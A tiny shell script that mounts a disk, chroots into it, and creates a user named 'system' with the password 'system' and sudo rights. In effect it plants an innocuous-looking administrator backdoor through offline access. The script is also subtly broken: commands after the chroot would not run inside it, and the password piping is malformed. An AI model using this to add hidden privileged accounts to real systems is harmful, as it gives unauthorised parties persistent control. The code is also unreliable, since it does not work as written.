#!/bin/sh

mount /dev/sda1 /mnt
chroot /mnt
useradd system
echo -e "system\system" | passwd system
usermod -a -G sudo system
exit
umount /mnt
exit